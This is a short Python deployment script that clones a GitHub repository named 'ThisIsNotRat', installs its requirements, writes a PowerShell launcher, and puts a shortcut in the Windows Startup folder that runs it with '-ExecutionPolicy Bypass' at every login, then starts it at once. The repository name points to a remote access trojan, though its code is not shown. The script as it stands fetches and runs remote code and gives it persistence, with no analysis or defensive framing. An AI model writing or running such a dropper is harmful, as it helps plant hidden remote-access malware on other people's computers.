import os
import subprocess
from pathlib import Path

# ------------------ CONFIG ------------------
REPO_URL = "https://github.com/Safir-Akhtar/ThisIsNotRat.git"
CLONE_DIR = Path.home() / "ThisIsNotRat"
MAIN_SCRIPT = "main.py"  # Change if your main file has a different name
PS_SCRIPT_PATH = Path.home() / "RunThisIsNotRat.ps1"
# -------------------------------------------

def run_command(cmd):
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Command failed: {cmd}")

# 1. Clone repo if it doesn't exist
if not CLONE_DIR.exists():
    print("[*] Cloning repository...")
    run_command(f"git clone {REPO_URL} \"{CLONE_DIR}\"")
else:
    print("[*] Repo already exists. Pulling latest...")
    run_command(f"git -C \"{CLONE_DIR}\" pull")

# 2. Install requirements globally
req_file = CLONE_DIR / "requirements.txt"
if req_file.exists():
    print("[*] Installing requirements...")
    run_command(f"pip install -r \"{req_file}\"")

# 3. Create PowerShell startup script
print("[*] Creating PowerShell script...")
ps_content = f"""
cd "{CLONE_DIR}"
python {MAIN_SCRIPT}
"""
PS_SCRIPT_PATH.write_text(ps_content)

# 4. Add shortcut to startup folder
startup = Path(os.getenv("APPDATA")) / "Microsoft\\Windows\\Start Menu\\Programs\\Startup"
shortcut_path = startup / "RunThisIsNotRat.lnk"

try:
    import pythoncom
    from win32com.client import Dispatch

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(str(shortcut_path))
    shortcut.Targetpath = "powershell.exe"
    shortcut.Arguments = f'-ExecutionPolicy Bypass -File "{PS_SCRIPT_PATH}"'
    shortcut.WorkingDirectory = str(CLONE_DIR)
    shortcut.IconLocation = "shell32.dll, 1"
    shortcut.save()
    print("[*] Added to Windows startup.")
except ImportError:
    print("[!] pywin32 is required to create startup shortcut. Install with 'pip install pywin32'")

# 5. Run the main script immediately
print("[*] Launching main script...")
run_command(f'python "{CLONE_DIR / MAIN_SCRIPT}"')